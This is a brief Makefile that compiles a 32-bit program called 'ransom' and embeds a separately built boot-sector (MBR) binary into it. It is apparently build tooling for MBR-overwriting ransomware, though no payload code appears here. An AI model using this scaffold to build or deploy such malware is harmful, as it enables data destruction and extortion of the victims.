OC = objcopy

.PHONY: all

all: ransom

clean:
	rm -f *.o mbrapp/*.o ransom mbrapp/mbr

ransom: main.c
	cd mbrapp && make
	cd ..
	$(OC) --readonly-text -I binary -O elf32-i386 -B i386 mbrapp/mbr mbr.o
	$(CC) -m32 -o ransom main.c mbr.o
	chmod -x ransom
